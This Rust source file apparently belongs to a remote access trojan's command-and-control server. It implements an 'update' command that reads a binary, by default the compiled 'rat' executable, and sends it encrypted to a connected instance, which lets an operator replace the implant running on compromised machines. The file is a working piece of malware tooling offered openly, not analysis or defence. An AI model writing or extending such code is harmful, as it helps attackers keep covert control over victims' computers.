use tokio::{fs::File, io::AsyncReadExt};

use crate::{connector_server::instance::Instance, server_cli};

#[derive(Debug, Clone)]

pub struct Update {
    name: String,
}

impl Update {
    pub fn new() -> Update {
        Update {
            name: "update".to_string(),
        }
    }
    pub fn get_name(&self) -> String {
        self.name.clone()
    }

    pub async fn run(&self, instance: &mut Instance) {
        let default_path = "../../../../rat/target/release/rat";

        let file_as_bytes = loop {
            println!(
                "Input an update file or press enter for default: \n Default: {}",
                default_path
            );

            let path = server_cli::handle_user_input().await;
            let chosen_path = if path.is_empty() {
                default_path
            } else {
                path.as_str()
            };
            match self.open_file_as_bytes(chosen_path).await {
                Some(bytes) => break bytes, //  valid file, break the loop
                None => continue,           //  invalid path, retry
            }
        };

        let public_key = instance.get_public_key();
        //make this struct in the future???
        let packet_sequence: [Vec<u8>; 2] = [
            self.get_name().as_bytes().to_vec(),
            file_as_bytes,
            //"stop_file_transfer".as_bytes().to_vec(),
        ];
        for element in packet_sequence {
            instance
                .send_hybrid_encryption(public_key.clone(), element)
                .await;
        }
        println!("Update sent");
        println!(
            "Result: {}",
            std::str::from_utf8(instance.accept_message().await.as_slice()).unwrap()
        );
    }
    //Make this actually return error instead of option
    pub async fn open_file_as_bytes(&self, path: &str) -> Option<Vec<u8>> {
        if let Ok(mut file) = File::open(path).await {
            let mut plaintext = Vec::new();
            file.read_to_end(&mut plaintext).await.unwrap();
            Some(plaintext)
        } else {
            eprintln!("Cannot open the path, you sure you entered the right one?");
            None
        }
    }
}
